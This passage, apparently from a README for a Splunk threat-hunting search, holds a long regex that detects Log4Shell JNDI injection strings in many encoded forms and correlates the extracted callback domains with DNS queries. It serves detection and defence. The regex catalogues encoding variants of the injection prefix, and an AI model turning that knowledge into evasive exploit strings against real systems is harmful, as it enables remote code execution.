0,2}1[15]6)).{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:.{0,30}?(?:[Ii]|%(?:25)*[46]9|\\\\(?:00[46]9|0{0,2}1[15]1)|ı)){2}.{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))|(?:[Cc]|%(?:25)*[46]3|\\\\(?:00[46]3|0{0,2}1[04]3)).{0,30}?(?:[Oo]|%(?:25)*[46][Ff]|\\\\(?:00[46][Ff]|0{0,2}1[15]7)).{0,30}?(?:[Rr]|%(?:25)*[57]2|\\\\(?:00[57]2|0{0,2}1[26]2)).{0,30}?(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1))|(?:[Nn]|%(?:25)*[46][Ee]|\\\\(?:00[46][Ee]|0{0,2}1[15]6)).{0,30}?(?:[Dd]|%(?:25)*[46]4|\\\\(?:00[46]4|0{0,2}1[04]4)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3))|(?:[Hh]|%(?:25)*[46]8|\\\\(?:00[46]8|0{0,2}1[15]0))(?:.{0,30}?(?:[Tt]|%(?:25)*[57]4|\\\\(?:00[57]4|0{0,2}1[26]4))){2}.{0,30}?(?:[Pp]|%(?:25)*[57]0|\\\\(?:00[57]0|0{0,2}1[26]0))(?:.{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)))?).{0,30}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72)).{0,30}?(?:\/|%(?:25)*2[Ff]|\\\\(?:002[Ff]|0{0,2}57)|\${)|(?:[Bb]|%(?:25)*[46]2|\\\\(?:00[46]2|0{0,2}1[04]2)).{0,30}?(?:[Aa]|%(?:25)*[46]1|\\\\(?:00[46]1|0{0,2}1[04]1)).{0,30}?(?:[Ss]|%(?:25)*[57]3|\\\\(?:00[57]3|0{0,2}1[26]3)).{0,30}?(?:[Ee]|%(?:25)*[46]5|\\\\(?:00[46]5|0{0,2}1[04]5)).{2,60}?(?::|%(?:25)*3[Aa]|\\\\(?:003[Aa]|0{0,2}72))(JH[s-v]|[\x2b\x2f-9A-Za-z][CSiy]R7|[\x2b\x2f-9A-Za-z]{2}[048AEIMQUYcgkosw]ke[\x2b\x2f-9w-z]))(?:\/|)(?<jndi_domain>.+?(?=\}[\,\"\'\s\/]|\}\\\\r|\||\s|\/))"
    | stats c by jndi_domain 
    | eval jndi_domain=replace(lower(jndi_domain), ".*?\$\{[a-z0-9-_:\.]+?\}","*"), jndi_domain=trim(jndi_domain,"}"),
      ip_version=case(match(jndi_domain,"(([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)|fe80:(:[0-9a-fA-F]{0,4}){0,4}%[0-9a-zA-Z]{1,}|::(ffff(:0{1,4}){0,1}:){0,1}((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])|([0-9a-fA-F]{1,4}:){1,4}:((25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9])\.){3,3}(25[0-5]|(2[0-4]|1{0,1}[0-9]){0,1}[0-9]))"),"ipv6", match(jndi_domain,"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?:$|\:\d{1,5}$)"),"ipv4", true(),"domain"), 
      ipv4=if(ip_version=="ipv4",jndi_domain,null()), 
      ipv6=if(ip_version=="ipv6",jndi_domain,null())
    | where !match(ip_version,"ipv\d") AND !match(jndi_domain,"^\$") AND !match(jndi_domain,"\}|\:") AND !match(jndi_domain,"\s") AND jndi_domain!="localhost" AND len(jndi_domain)>4 AND match(jndi_domain,".*\..*")
    | fields jndi_domain
    | rename jndi_domain AS DNS.query ] by _time span=1s DNS.src DNS.query
```

#### Example output
![DNS output example](/images/log4j_dns.PNG?raw=true "DNS example output")


## Credits
The regex to catch "all" possible jndi prefixes comes from https://github.com/back2root/log4shell-rex 